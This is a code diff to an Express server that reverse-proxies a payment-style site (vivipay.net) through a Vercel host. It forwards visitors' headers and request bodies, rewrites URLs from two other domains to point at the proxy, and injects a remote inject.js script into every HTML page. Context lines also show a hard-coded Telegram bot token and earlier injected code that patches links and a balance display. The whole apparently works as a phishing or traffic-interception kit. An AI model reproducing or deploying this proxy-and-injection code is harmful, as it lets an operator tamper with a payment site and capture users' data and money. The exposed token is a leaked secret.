@@ -5,6 +5,7 @@ const { Redis } = require('@upstash/redis');
 const app = express();
 const TIVOX_API = 'https://tivox.icu';
 const REAL_API = 'https://qonix.click';
+const FRONTEND_HOST = 'vivipay.net';
 const PROXY_HOST = 'rtyhh.vercel.app';
 const BOT_TOKEN = '8537838501:AAGuVHlnxIMo6OFORmhzSvRpkkhH2-0qDCI';
 const WEBHOOK_URL = 'https://rtyhh.vercel.app/bot-webhook';
@@ -1454,5 +1455,91 @@ obs2.observe(document.body,{childList:true,subtree:true,characterData:true});});
 setInterval(function(){fixLinks();fixOnClick();},2000);
 fixLinks();fixOnClick();patchBalDOM();
 })();`;
+
+// ─── Frontend catch-all proxy ───────────────────────────────────────────────
+// Proxy everything else from vivipay.net
+// For HTML responses: inject our inject.js script into <head>
+app.all('*', async (req, res) => {
+  try {
+    const path = req.originalUrl || req.url;
+    const url = 'https://' + FRONTEND_HOST + path;
+
+    const fwd = {};
+    for (const [k, v] of Object.entries(req.headers)) {
+      const kl = k.toLowerCase();
+      if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
+          kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
+      fwd[k] = v;
+    }
+    fwd['host'] = FRONTEND_HOST;
+    fwd['origin'] = 'https://' + FRONTEND_HOST;
+    fwd['referer'] = 'https://' + FRONTEND_HOST + '/';
+
+    const opts = { method: req.method, headers: fwd, redirect: 'follow' };
+    if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
+      opts.body = req.rawBody;
+      fwd['content-length'] = String(req.rawBody.length);
+    }
+
+    const response = await fetch(url, opts);
+    const ct = response.headers.get('content-type') || '';
+
+    // Pass through response headers (skip hop-by-hop)
+    const skipHeaders = new Set(['transfer-encoding','connection','content-encoding','content-length','keep-alive']);
+    response.headers.forEach((val, key) => {
+      if (!skipHeaders.has(key.toLowerCase())) {
+        res.setHeader(key, val);
+      }
+    });
+
+    res.setHeader('Access-Control-Allow-Origin', '*');
+
+    // HTML — inject our script
+    if (ct.includes('text/html')) {
+      let html = await response.text();
+
+      // Rewrite absolute tivox.icu / qonix.click URLs in HTML to go through proxy
+      const proxyBase = 'https://' + PROXY_HOST;
+      html = html.replace(/https:\/\/tivox\.icu/g, proxyBase);
+      html = html.replace(/https:\/\/qonix\.click/g, proxyBase);
+
+      // Inject inject.js right before </head>
+      const injectTag = `<script src="${proxyBase}/inject.js" defer></script>`;
+      if (html.includes('</head>')) {
+        html = html.replace('</head>', injectTag + '\n</head>');
+      } else {
+        html = injectTag + '\n' + html;
+      }
+
+      const buf = Buffer.from(html, 'utf-8');
+      res.setHeader('content-type', 'text/html; charset=utf-8');
+      res.setHeader('content-length', String(buf.length));
+      res.status(response.status).end(buf);
+      return;
+    }
+
+    // JS — rewrite tivox/qonix references to proxy
+    if (ct.includes('javascript')) {
+      let js = await response.text();
+      const proxyBase = 'https://' + PROXY_HOST;
+      js = js.replace(/https:\/\/tivox\.icu/g, proxyBase);
+      js = js.replace(/https:\/\/qonix\.click/g, proxyBase);
+      const buf = Buffer.from(js, 'utf-8');
+      res.setHeader('content-type', ct);
+      res.setHeader('content-length', String(buf.length));
+      res.status(response.status).end(buf);
+      return;
+    }
+
+    // Everything else — stream as-is
+    const buf = Buffer.from(await response.arrayBuffer());
+    res.setHeader('content-length', String(buf.length));
+    res.status(response.status).end(buf);
+
+  } catch(e) {
+    console.error('Frontend proxy error:', e.message);
+    if (!res.headersSent) res.status(502).send('Proxy error: ' + e.message);
+  }
+});
 
 module.exports = app;
